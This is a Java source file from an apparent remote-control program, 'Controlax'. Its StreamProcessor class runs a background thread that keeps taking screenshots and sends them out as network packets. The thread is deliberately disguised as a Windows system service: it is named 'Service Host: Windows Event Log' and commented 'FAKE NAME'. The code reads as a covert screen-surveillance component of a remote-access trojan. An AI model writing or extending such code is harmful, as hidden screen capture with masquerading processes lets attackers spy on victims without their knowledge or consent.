package com.khopan.controlax;

import com.khopan.controlax.packet.HeaderedImagePacket;

public class StreamProcessor {
	public static final StreamProcessor INSTANCE = new StreamProcessor();

	private final Thread processingThread;

	private volatile boolean start;
	private long waitTime;
	private int frame;

	private StreamProcessor() {
		this.processingThread = new Thread(this :: process);
		this.processingThread.setPriority(7);
		this.processingThread.setName("Service Host: Windows Event Log"); // FAKE NAME
		this.processingThread.start();
	}

	private void process() {
		while(true) {
			if(this.start) {
				this.frame++;
				HeaderedImagePacket packet = new HeaderedImagePacket(ImageProcessor.takeScreenshot(), ImageProcessor.STREAM_HEADER, this.frame);
				Controlax.INSTANCE.processor.sendPacket(packet);
				//this.sendImage(ImageProcessor.takeScreenshot(), this.frame);

				try {
					Thread.sleep(this.waitTime);
				} catch(Throwable Errors) {

				}
			}
		}
	}

	/*private void sendImage(BufferedImage screenshot, int frame) {
		new Thread(() -> {
			HeaderedImagePacket packet = new HeaderedImagePacket(screenshot, ImageProcessor.STREAM_HEADER, frame);
			Controlax.INSTANCE.processor.sendPacket(packet);
		}).start();
	}*/

	public void start(int framerate) {
		this.start = true;
		this.waitTime = Math.round(1000.0d / ((double) framerate));
		this.frame = 0;
	}

	public void stop() {
		this.start = false;
	}

	public static void load() {
		// Load the class only
	}
}
